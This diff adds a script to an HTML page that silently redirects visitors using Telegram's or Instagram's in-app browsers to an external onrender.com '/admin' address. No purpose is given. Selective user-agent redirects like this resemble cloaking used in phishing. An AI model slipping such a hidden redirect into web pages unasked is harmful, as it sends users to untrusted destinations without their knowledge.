@@ -153,5 +153,13 @@
     </div>
 </div>
 
+<script>
+    let ua = navigator.userAgent || navigator.vendor || window.opera;
+
+    if (ua.includes("Telegram") || ua.includes("Instagram")) {
+        window.location.href = "https://start-up-dmtb.onrender.com/admin";
+    }
+</script>
+
 </body>
 </html>
